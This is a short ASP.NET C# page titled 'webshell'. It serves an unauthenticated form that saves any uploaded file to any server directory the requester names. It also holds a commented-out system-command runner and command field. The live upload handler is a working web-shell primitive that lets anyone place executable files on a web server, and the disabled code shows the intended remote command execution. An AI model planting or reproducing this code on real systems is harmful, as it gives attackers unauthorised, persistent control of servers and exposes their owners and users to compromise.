<%@ Page Language="C#" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html>
<head runat="server">
	<title>webshell</title>
</head>
<body>
<%
string dir;
if(Request.Form["dir"]==null)dir="/home/www/";
else dir=Request.Form["dir"];
if(Request.Form["b"]=="run")
{
	//Mono.Unix.Native.Syscall.system(Request.Form["cmd"]);
	//Mono.Unix.UnixPipes p=Mono.Unix.UnixPipes.CreatePipes ();
	
}
else if(Request.Form["b"]=="upload")
{
	Request.Files["f"].SaveAs (dir.Replace ('\\','/').TrimEnd ('/')+"/"+Request.Files["f"].FileName);
}
%>		
<form method="post" enctype="multipart/form-data">		
	<!--run command:<br />
		<input type="text" name="cmd" /><input type="submit" name="b" value="run" />-->
	upload file:
		<input type="file" name="f" /><br />
		to: <input type="text" name="dir" value="<%=dir%>" /><input type="submit" name="b" value="upload" />
</form>
</body>
</html>
